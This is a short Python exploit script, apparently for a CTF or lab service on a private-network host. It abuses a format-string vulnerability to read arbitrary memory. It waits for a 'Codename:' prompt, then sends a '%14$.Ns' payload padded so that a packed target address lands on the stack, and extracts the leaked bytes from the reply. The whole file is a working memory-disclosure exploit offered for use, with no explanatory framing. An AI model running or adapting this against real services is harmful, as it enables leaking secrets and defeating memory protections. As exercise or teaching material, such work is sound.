#!/usr/bin/env python3
import socket
import struct
import sys

HOST = "10.112.0.12"
PORT = int(sys.argv[1])


def recv_until(sock, marker, timeout=3.0):
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def read_memory(address, size=64):
    with socket.create_connection((HOST, PORT), timeout=3.0) as sock:
        recv_until(sock, b"Codename:\n")
        fmt = f"%14$.{size}sEND".encode()
        payload = fmt + b"\x00" + b"A" * (64 - len(fmt) - 1)
        payload += struct.pack("<Q", address) + b"\n"
        sock.sendall(payload)
        output = recv_until(sock, b"Packet length:\n")
        start = output.find(b"AUDIT: ")
        end = output.find(b"END", start + 7)
        if start < 0 or end < 0:
            return output
        return output[start + 7:end]

for text in sys.argv[2:]:
    address = int(text, 0)
    try:
        print(hex(address), read_memory(address))
    except Exception as exc:
        print(hex(address), "ERROR", exc)
